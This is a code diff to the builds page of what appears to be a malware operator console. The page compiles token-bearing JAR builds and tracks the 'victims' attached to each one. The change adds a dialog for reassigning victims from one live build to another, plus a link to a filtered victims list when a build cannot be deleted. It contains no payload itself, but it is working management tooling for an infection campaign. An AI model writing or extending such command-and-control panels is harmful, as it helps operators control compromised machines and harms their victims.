@@ -1,8 +1,9 @@
 'use client';
 import { useState } from 'react';
-import { Copy, Download, Hammer, Power, Plus, Trash2 } from 'lucide-react';
+import { ArrowRightLeft, Copy, Download, Hammer, Power, Plus, Trash2 } from 'lucide-react';
 import { toast } from 'sonner';
 import { useApi, mutate } from '@/hooks/useApi';
+import { ApiError } from '@/lib/api';
 import { useRole } from '@/components/live-provider';
 import { Topbar } from '@/components/topbar';
 import { Badge } from '@/components/ui/badge';
@@ -18,6 +19,8 @@ export default function BuildsPage() {
   const { data, loading, refresh, error } = useApi<{ items: Build[] }>('/builds', { pollMs: 15_000 });
   const [open, setOpen] = useState(false);
   const [busy, setBusy] = useState('');
+  const [reassignFor, setReassignFor] = useState<Build | null>(null);
+  const [reassignTarget, setReassignTarget] = useState('');
   const [form, setForm] = useState({ name: '', version: '1.0.0', profile: 'full' });
   const role = useRole();
 
@@ -71,7 +74,30 @@ export default function BuildsPage() {
       toast.success('Build deleted');
       refresh();
     } catch (caught) {
-      toast.error(caught instanceof Error ? caught.message : 'delete failed');
+      if (caught instanceof ApiError && caught.code === 'in_use') {
+        toast.error(caught.message, {
+          description: 'Reassign its victims or open the filtered list.',
+          action: { label: 'Open victims', onClick: () => window.open(`/victims?build=${build.id}`, '_blank') }
+        });
+      } else {
+        toast.error(caught instanceof Error ? caught.message : 'delete failed');
+      }
+    } finally {
+      setBusy('');
+    }
+  }
+
+  async function reassign(event: React.FormEvent) {
+    event.preventDefault();
+    if (!reassignFor || !reassignTarget) return;
+    setBusy(reassignFor.id);
+    try {
+      const result = await mutate<{ moved: number }>(`/builds/${reassignFor.id}/reassign`, 'POST', { target: reassignTarget });
+      toast.success(`${result.moved} victim(s) reassigned`);
+      setReassignFor(null);
+      refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'reassign failed');
     } finally {
       setBusy('');
     }
@@ -104,6 +130,7 @@ export default function BuildsPage() {
                         <Button size="icon" variant="ghost" title="copy token" onClick={() => { copy(build.token); toast.success('build token copied'); }}><Copy className="h-3 w-3" /></Button>
                         {role === 'admin' ? <Button size="icon" variant="ghost" title="compile" loading={busy === build.id} onClick={() => compile(build.id)}><Hammer className="h-3 w-3" /></Button> : null}
                         {build.jarPath ? <a href={`/api/console/builds/${build.id}/download`} className="grid h-7 w-7 place-items-center rounded text-muted hover:text-brand"><Download className="h-3 w-3" /></a> : null}
+                        {role === 'admin' ? <Button size="icon" variant="ghost" title="reassign victims" disabled={build.victims === 0 || busy === build.id} onClick={() => { setReassignFor(build); setReassignTarget(''); }}><ArrowRightLeft className="h-3 w-3" /></Button> : null}
                         {build.status !== 'revoked' && role === 'admin' ? <Button size="icon" variant="ghost" title="revoke" loading={busy === build.id} disabled={busy === build.id} onClick={() => revoke(build)}><Power className="h-3 w-3" /></Button> : null}
                         {role === 'admin' ? <Button size="icon" variant="ghost" title="delete (must not be in use)" loading={busy === build.id} disabled={busy === build.id} onClick={() => remove(build)}><Trash2 className="h-3 w-3" /></Button> : null}
                       </div>
@@ -128,6 +155,30 @@ export default function BuildsPage() {
               <div className="flex justify-end"><Button type="submit" loading={busy === 'create'}>Create</Button></div>
             </form>
           </CardContent>
+        </DialogContent>
+      </Dialog>
+
+      <Dialog open={Boolean(reassignFor)} onOpenChange={(value) => { if (!value) setReassignFor(null); }}>
+        <DialogContent>
+          <DialogTitle>Reassign victims before deleting</DialogTitle>
+          <form onSubmit={reassign} className="mt-3 space-y-2">
+            <p className="text-xs text-muted">
+              {reassignFor?.name} v{reassignFor?.version} has {reassignFor?.victims} victim(s). Move them to another live build.
+            </p>
+            <div>
+              <Label>Target build</Label>
+              <Select value={reassignTarget} onChange={(event) => setReassignTarget(event.target.value)} className="w-full">
+                <option value="">select…</option>
+                {(data?.items ?? []).filter((item) => item.id !== reassignFor?.id && item.status !== 'revoked').map((item) => (
+                  <option key={item.id} value={item.id}>{item.name} v{item.version} · {item.profile}</option>
+                ))}
+              </Select>
+            </div>
+            <div className="flex justify-end gap-2">
+              <Button type="button" variant="ghost" onClick={() => setReassignFor(null)}>Cancel</Button>
+              <Button type="submit" disabled={!reassignTarget} loading={busy === reassignFor?.id}>Reassign</Button>
+            </div>
+          </form>
         </DialogContent>
       </Dialog>
     </>
